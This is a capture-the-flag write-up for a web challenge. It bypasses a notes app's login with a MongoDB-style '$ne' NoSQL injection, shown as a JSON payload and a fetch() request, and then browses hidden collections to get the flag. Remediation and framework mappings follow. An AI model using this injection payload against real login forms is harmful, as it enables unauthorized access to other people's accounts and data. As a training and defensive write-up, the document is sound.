# No Structure Required

**Category:** Web
**Challenge:** No Structure Required
**CTF:** Pointer Overflow CTF 2026
**Points:** WEB 100, Wave 3
**Result:** Solved

**Flag:**

~~~text
POCTF{78.1391.f9abb0b1889ab33f.6GNTWXFDVQY4K2OZNWWHD3IKNX}
~~~

---

## 1. Reconnaissance

The challenge presents "SecureNotes v1.0," an internal notes platform from a defunct vendor. It features a login page, a browse page, and claims to have "deleted" records. The footer reads:

~~~text
Powered by Whitmore Storage Engine v0.9
document store - no schema required
~~~

The phrase "document store, no schema required" immediately signals a NoSQL backend, and the challenge name reinforces this. No credentials are provided; the goal is to bypass authentication.

---

## 2. Identifying the Vulnerability

The login form accepts username and password fields. Given the NoSQL backend, the classic attack vector is **NoSQL injection** using MongoDB-style query operators.

Instead of sending string values, the attacker sends JSON objects with comparison operators:

~~~json
{
  "username": {"$ne": ""},
  "password": {"$ne": ""}
}
~~~

The `$ne` (not equal) operator causes the query to match any user whose username and password are both non-empty, effectively bypassing authentication without knowing any credentials.

---

## 3. Exploitation

### Step 1: NoSQL Injection for Auth Bypass

~~~javascript
const resp = await fetch('/challenges/no-structure-required/notes-app/login', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  credentials: 'include',
  body: JSON.stringify({
    username: {"$ne": ""},
    password: {"$ne": ""}
  })
});
~~~

Response:

~~~json
{"message": "Signed in as j.abernathy.", "next": "/challenges/no-structure-required/notes-app/dashboard", "ok": true}
~~~

### Step 2: Dashboard Reconnaissance

The dashboard shows three visible collections accessible via the `/browse?col=<name>` parameter:

- `notes`: three user notes (grocery list, ward rounds, backup schedule)
- `users`: three user accounts with plaintext password hashes

### Step 3: Audit Log Discovery

Browsing the `audit_log` collection reveals a critical entry:

~~~json
{
  "_id": 2,
  "actor": "sysadmin",
  "event": "config_change",
  "note": "collection 'secrets' access flagged for redaction",
  "ts": "1887-11-14T08:30"
}
~~~

This confirms the existence of a hidden `secrets` collection.

### Step 4: Accessing the Secrets Collection

~~~text
/browse?col=secrets
~~~

Response:

~~~json
{
  "_id": 1,
  "flag": "POCTF{78.1391.f9abb0b1889ab33f.6GNTWXFDVQY4K2OZNWWHD3IKNX}",
  "label": "team-flag",
  "note": "Do not share. This is the token the compliance auditor requested."
}
~~~

---

## 4. Attack Flow Summary

~~~text
Login page (SecureNotes v1.0)
    |
POST NoSQL injection: {"username":{"$ne":""},"password":{"$ne":""}}
    |
Auth bypass -> signed in as j.abernathy
    |
Dashboard -> /browse?col=notes, ?col=users (recon)
    |
/browse?col=audit_log -> discovers 'secrets' collection
    |
/browse?col=secrets -> FLAG
~~~

---

## 5. Verification

Submitted the flag on the challenge page:

~~~text
Auditor's signature verified.
~~~

---

## 6. Tools Used

- Browser JavaScript (fetch API for HTTP requests)
- No external tools required; the entire exploit ran in-browser

---

## 7. MITRE ATT&CK Mapping

| Phase | Tactic | Technique | TTP-ID |
|-------|--------|-----------|--------|
| Reconnaissance | TA0043 | Gather Victim Host Information: Software | T1592.002 |
| Initial Access | TA0001 | Exploit Public-Facing Application | T1190 |
| Credential Access | TA0006 | Brute Force: Credential Stuffing (bypassed via operator injection) | T1110.004 |
| Collection | TA0009 | Data from Information Repositories | T1213 |
| Discovery | TA0007 | Account Discovery: Local Account | T1087.001 |

---

## 8. Remediation and Containment

### Technical Fixes

1. Validate and sanitize all user inputs on the server side; reject objects and operators in fields expecting strings
2. Use parameterized queries or an ORM abstraction that prevents operator injection in MongoDB
3. Restrict the `/browse` endpoint with per-collection access control; do not allow arbitrary collection enumeration via query parameter
4. Remove or obfuscate technology stack identifiers in page footers ("Whitmore Storage Engine v0.9")

### OWASP Top 10

- **A03:2021 Injection:** NoSQL injection via MongoDB query operators (`$ne`, `$gt`, `$regex`) in authentication logic
- **A01:2021 Broken Access Control:** unauthenticated browsing of arbitrary collections including `secrets`

### MITRE D3FEND Countermeasures

- **D3-IPCF (IPC Filtering):** filter and validate inter-process communication payloads before they reach the database driver
- **D3-SPP (Strong Password Policy):** enforce credential complexity so operator-based bypass requires more sophisticated injection
- **D3-ACL (Access Control List):** enforce per-collection authorization at the application layer

### NIST CSF 2.0

- **Protect (PR.AA):** enforce identity verification and access control for all data stores
- **Protect (PR.DS):** protect data at rest; sensitive collections must not be browsable by default
- **Detect (DE.CM):** monitor for anomalous query patterns (operator injection payloads in login requests)

### NIST SP 800-53 Rev. 5

- **SI-10 (Information Input Validation):** validate all inputs against expected types; reject unexpected JSON operators
- **AC-3 (Access Enforcement):** enforce authorization on each collection endpoint
- **AC-6 (Least Privilege):** application database user should have read access only to required collections
- **AU-6 (Audit Record Review):** review audit logs for injection attempts and unauthorized collection access

### C2M2

- **Domain:** ACCESS (Identity and Access Management)
- **Practice:** Implement and maintain access control mechanisms for data repositories
- **Target MIL:** MIL-2

---

Thanks guys!! (❍ᴥ❍ʋ)

---

NoSQL injection remains one of the most overlooked web vulnerabilities out there. If this walkthrough helped you understand document store security, pass it along to your team.

- Instagram: https://www.instagram.com/uniaogeek
- LinkedIn: http://linkedin.com/in/mrhenrike
- X: https://x.com/mrhenrike
